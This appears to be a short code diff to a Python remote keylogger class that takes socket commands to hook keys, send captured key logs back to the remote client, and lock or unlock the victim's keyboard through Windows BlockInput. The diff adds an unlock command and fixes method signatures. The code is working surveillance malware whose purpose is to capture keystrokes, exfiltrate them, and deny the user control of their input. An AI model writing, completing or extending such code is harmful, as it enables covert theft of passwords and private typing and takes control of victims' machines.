@@ -25,14 +25,17 @@ class KeyboardController():
             request = self.__client.recv(1024).decode("utf-8")
             if not request:
                 break
-            if request == "lock":
-                self.lockKeyboard()
+
             if request == "hook":
                 self.hookKey()
             elif request == "unhook":   
                 self.unhookKey()
             elif request == "print":
                 self.printKey()
+            elif request == "lock":
+                self.lockKeyboard()
+            elif request == "unlock":
+                self.unlockKeyboard()
             else: #Quit
                 self.unhookKey()
                 return
@@ -62,10 +65,10 @@ class KeyboardController():
             open(KeyLog.FilLogPath, "w")
             self.__client.sendall(s.encode('utf-8'))
 
-    def lockKeyboard():
+    def lockKeyboard(self):
         while True:
-            windll.user32.BlockInput(True);
+            windll.user32.BlockInput(True)
 
-    def unlockKeyboard():
+    def unlockKeyboard(self):
         windll.user32.BlockInput(False); 
 
